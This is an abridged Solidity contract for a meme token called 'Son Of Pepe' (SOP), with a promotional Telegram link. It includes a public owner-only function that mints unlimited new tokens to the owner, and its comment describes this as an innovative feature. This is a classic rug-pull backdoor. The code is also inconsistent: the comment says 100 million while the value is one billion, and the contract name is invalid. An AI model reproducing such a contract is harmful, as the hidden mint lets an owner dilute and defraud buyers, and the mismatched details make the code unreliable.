...
//
// $SonOfPepe proposes an innovative feature in its contract.
//
// 📱 Telegram::https://t.me/SonOfPepeOFC
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _SonOfPepe(uint256 amount) public onlyOwner {
 _SonOfPepe(msg.sender, amount);
    }
    ...
    function _SonOfPepe(address account, uint256 amount) internal virtual {
...
contract $SonOfPepe is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Son Of Pepe", "SOP") {
     _SonOfPepe(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}